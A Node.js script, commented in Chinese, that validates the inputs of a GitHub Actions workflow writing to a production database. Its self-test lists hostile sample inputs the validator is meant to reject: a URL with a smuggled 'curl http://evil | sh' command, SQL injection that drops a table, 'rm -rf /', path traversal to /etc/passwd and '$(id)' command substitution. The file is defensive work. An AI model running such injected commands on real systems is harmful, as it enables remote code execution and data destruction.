#!/usr/bin/env node
/**
 * data-sync 输入校验（唯一权威源）。
 *
 * 为什么需要它：.github/workflows/data-sync.yml 是 workflow_dispatch 触发的**生产库写入**通道，
 * 三个输入原先直接拼进 shell 文本（\`\${{ inputs.asset_url }}\` 直插 run:、TABLE 先被本地双引号展开），
 * 属命令注入/SQL 注入面（专项5 N-1a）。本文件把"什么算合法输入"收成一处可测判据：
 * workflow 只负责把 env 传进来，合法性由这里裁决。
 *
 * 用法：
 *   node scripts/check-data-sync-inputs.cjs --asset-url <url> --table <name> [--file-name <name>]
 *   node scripts/check-data-sync-inputs.cjs --selftest      # 内置正/负样本自检（可复跑）
 * 退出码：0 = 全部合法；1 = 有非法输入（打印 ::error:: 行）。
 */
'use strict'

/** 只允许本项目 release 资产：换仓库/换域名即拒绝（前缀可由 env 覆盖，便于测试）。 */
const DEFAULT_ASSET_PREFIX = 'https://github.com/Andy38586/beibu-gulf-project/releases/download/'

/** PostgreSQL 标识符：小写字母/下划线开头，长度 <= 63，杜绝引号、分号、注释符。 */
const TABLE_RE = /^[a-z_][a-z0-9_]{0,62}$/

/** 文件名：字母数字开头，只允许 . _ -，长度 <= 64；显式禁 '..' 与首字符 '-'。 */
const FILE_RE = /^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$/

const ASSET_URL_RE =
  /^https:\/\/github\.com\/[A-Za-z0-9._-]+\/[A-Za-z0-9._-]+\/releases\/download\/[A-Za-z0-9._-]+\/[A-Za-z0-9._-]+$/

/**
 * @param {{assetUrl?: string, table?: string, fileName?: string}} input
 * @param {{assetPrefix?: string}} [opts]
 * @returns {{ok: boolean, errors: string[]}}
 */
function validateInputs(input, opts) {
  const prefix = (opts && opts.assetPrefix) || DEFAULT_ASSET_PREFIX
  const errors = []
  const assetUrl = input.assetUrl
  const table = input.table
  const fileName =
    input.fileName === undefined || input.fileName === '' ? 'sync.dump' : input.fileName

  if (typeof assetUrl !== 'string' || assetUrl === '') {
    errors.push('asset_url 必填')
  } else if (assetUrl !== assetUrl.trim()) {
    errors.push('asset_url 不得含首尾空白')
  } else if (!assetUrl.startsWith(prefix)) {
    errors.push('asset_url 必须来自 ' + prefix)
  } else if (!ASSET_URL_RE.test(assetUrl)) {
    errors.push('asset_url 形状不合法（只允许 <owner>/<repo>/releases/download/<tag>/<file>）')
  }

  if (typeof table !== 'string' || table === '') {
    errors.push('table 必填')
  } else if (!TABLE_RE.test(table)) {
    errors.push('table 只允许 [a-z_][a-z0-9_]{0,62}（禁引号/分号/大写/横线）')
  }

  if (typeof fileName !== 'string' || fileName === '') {
    errors.push('file_name 必填')
  } else if (!FILE_RE.test(fileName) || fileName.includes('..')) {
    errors.push('file_name 只允许 [A-Za-z0-9._-]、不得含 ..、不得以 - 开头')
  }

  return { ok: errors.length === 0, errors: errors }
}

/** 正/负样本自检：正样本必须过，负样本必须拦（判据的能红性）。 */
const SELFTEST_CASES = [
  {
    name: '正样本·文档示例',
    input: {
      assetUrl: DEFAULT_ASSET_PREFIX + 'v1/suitability_cells-142477.dump',
      table: 'suitability_cells',
      fileName: 'sync.dump',
    },
    ok: true,
  },
  {
    name: '负样本·URL 命令注入',
    input: {
      assetUrl: DEFAULT_ASSET_PREFIX + 'v1/x.dump"; curl http://evil | sh ; "',
      table: 'canal',
      fileName: 'sync.dump',
    },
    ok: false,
  },
  {
    name: '负样本·URL 换域名',
    input: { assetUrl: 'https://evil.example.com/x.dump', table: 'canal', fileName: 'sync.dump' },
    ok: false,
  },
  {
    name: '负样本·table SQL 注入',
    input: {
      assetUrl: DEFAULT_ASSET_PREFIX + 'v1/x.dump',
      table: "canal'; drop table roads; --",
      fileName: 'sync.dump',
    },
    ok: false,
  },
  {
    name: '负样本·table 命令拼接',
    input: {
      assetUrl: DEFAULT_ASSET_PREFIX + 'v1/x.dump',
      table: 'canal;rm -rf /',
      fileName: 'sync.dump',
    },
    ok: false,
  },
  {
    name: '负样本·file_name 路径穿越',
    input: {
      assetUrl: DEFAULT_ASSET_PREFIX + 'v1/x.dump',
      table: 'canal',
      fileName: '../../etc/passwd',
    },
    ok: false,
  },
  {
    name: '负样本·file_name 命令替换',
    input: { assetUrl: DEFAULT_ASSET_PREFIX + 'v1/x.dump', table: 'canal', fileName: '$(id).dump' },
    ok: false,
  },
]

function runSelfTest() {
  let bad = 0
  for (const c of SELFTEST_CASES) {
    const res = validateInputs(c.input)
    const pass = res.ok === c.ok
    if (!pass) bad++
    console.log(
      (pass ? 'PASS  ' : 'FAIL  ') +
        c.name +
        '  ok=' +
        res.ok +
        '  errors=' +
        JSON.stringify(res.errors)
    )
  }
  console.log('[selftest] ' + (SELFTEST_CASES.length - bad) + '/' + SELFTEST_CASES.length + ' pass')
  return bad === 0 ? 0 : 1
}

function parseArgv(argv) {
  const out = {}
  for (let i = 0; i < argv.length; i++) {
    const a = argv[i]
    if (a === '--asset-url') out.assetUrl = argv[++i]
    else if (a === '--table') out.table = argv[++i]
    else if (a === '--file-name') out.fileName = argv[++i]
    else if (a === '--selftest') out.selftest = true
  }
  return out
}

function main() {
  const args = parseArgv(process.argv.slice(2))
  if (args.selftest) process.exit(runSelfTest())
  const res = validateInputs(args)
  if (!res.ok) {
    for (const e of res.errors) console.log('::error::data-sync 输入非法：' + e)
    process.exit(1)
  }
  console.log('输入校验通过：table=' + args.table + ' file_name=' + (args.fileName || 'sync.dump'))
  process.exit(0)
}

if (require.main === module) main()

module.exports = { validateInputs, DEFAULT_ASSET_PREFIX, TABLE_RE, FILE_RE, ASSET_URL_RE }
